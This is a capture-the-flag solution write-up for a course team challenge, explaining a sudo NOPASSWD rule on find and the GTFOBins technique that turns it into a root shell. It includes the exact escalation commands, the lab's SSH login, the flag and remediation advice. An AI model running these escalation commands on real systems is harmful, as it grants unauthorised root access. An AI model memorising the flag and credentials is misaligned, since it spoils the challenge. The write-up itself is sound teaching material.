# Step 4, vertical privilege escalation (sudo misconfiguration + GTFOBins)

The final box in my column. Isaac's RE hands the player a login,
**`fieldtech` / `FieldT3ch_2874`**, and they SSH into this host as that low-priv
user. Goal: become **root** and read the final flag at `/home/fieldtech/disarm-authorization.txt`.

**Flag:** `CITS3006{xyOTpUwAhd}` (the column's root / disarm flag)

This VPE is deliberately different from the other two in the CTF: Isaac's is a
PATH hijack and Senaya's is a tar wildcard injection. Mine is a **NOPASSWD sudo
rule on a binary that can spawn a shell** (a classic GTFOBins escalation).

---

## Intended solution

**1. Enumerate what you can do.** After landing as `fieldtech`, the first thing to
check for privilege escalation is your sudo rights:
```bash
sudo -l
```
Output:
```
User fieldtech may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```
So you can run `find` as root, with no password.

**2. Turn `find` into a root shell.** `find` has a `-exec` action that runs an
arbitrary command; because sudo runs `find` itself as root, that command runs as
root too (this is the standard GTFOBins technique for `find`):
```bash
sudo find . -maxdepth 0 -exec /bin/sh \;
# id  -> uid=0(root)
cat /home/fieldtech/disarm-authorization.txt                # final flag
```
(Or read it directly in one line: `sudo find . -maxdepth 0 -exec cat /home/fieldtech/disarm-authorization.txt \;`.)

## Why it works
`find`'s `-exec` runs a program, and sudo has launched `find` with the identity of
root. The command spawned by `-exec` therefore inherits root. The `NOPASSWD` rule
was meant to let the field tech run *filesystem scans* as root, but nothing stops
`find` from executing an arbitrary program, so the "run one safe tool" rule is
actually "run anything as root." That is the misconfiguration.

## The fix (remediation)
Don't grant sudo on binaries that can execute other programs (`find`, `vim`,
`less`, `awk`, interpreters, etc.); consult GTFOBins before writing a sudoers rule.
If a scan really is needed, wrap it in a fixed, non-interactive script that takes no
user-controlled command, and grant sudo on that script instead, with the arguments
locked down.

## Running / testing this box
```bash
docker compose up --build
ssh fieldtech@localhost -p 2022     # password: FieldT3ch_2874
sudo -l                              # see the NOPASSWD find rule
sudo find . -maxdepth 0 -exec /bin/sh \;   # -> root
cat /home/fieldtech/disarm-authorization.txt
```
The SSH login IS the handoff: in the full chain, Isaac's RE is what reveals the
`fieldtech` credential, so a player can only reach this box by finishing his stage.

## Handoff notes (for the team)
- **From Isaac:** his RE's payoff is the login **`fieldtech` / `FieldT3ch_2874`**
  (unchanged, the switch from PATH hijack to sudo misconfig did NOT change the SSH
  credential). 
- **To the bomb:** reading `/home/fieldtech/disarm-authorization.txt` as root is this column's contribution to
  `CITS3006{FINAL_FLAG}`, bomb disarmed.
